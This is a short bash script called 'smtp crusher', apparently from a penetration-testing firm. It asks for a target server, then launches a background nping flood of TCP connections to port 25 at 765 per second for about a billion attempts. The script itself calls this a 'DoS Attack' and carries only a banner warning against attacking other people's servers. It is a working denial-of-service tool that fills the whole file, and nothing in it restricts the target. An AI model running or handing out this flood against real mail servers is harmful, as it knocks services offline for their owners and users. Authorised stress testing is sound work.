#!/bin/bash 

touch ./log/pattern.log
echo "" > ./log/pattern.log


echo -e "
               _
 ___ _ __ ___ | |_ _ __     ___ _ __ _   _ ___| |__   ___ _ __ 
/ __| '_ \` _ \| __| '_ \   / __| '__| | | / __| '_ \ / _ \ '__|
\__ \ | | | | | |_| |_) | | (__| |  | |_| \__ \ | | |  __/ |   
|___/_| |_| |_|\__| .__/   \___|_|   \__,_|___/_| |_|\___|_|   
                  |_|                                         
Written by Tim Schughart | Copyright Prosec networks e.K.

Warning only for internal use! Do not attack someone else servers!


"
echo -n "Please enter target server:"
read target

echo -e "DoS Attack running - pick up a coffee :)"
echo -e "Check logfiles for more details"
echo -e "tail -f ./log/pattern.log"
echo -e "Check SMTP functionality: "nmap -Pn -p 25 $target""

nping --tcp-connect -rate 765 -c 999999999 -q $target -p 25 -v 1>/dev/null 2>>log/pattern.log &

echo -e "Press any key to exit"
read tmp
killall nping 2> /dev/null
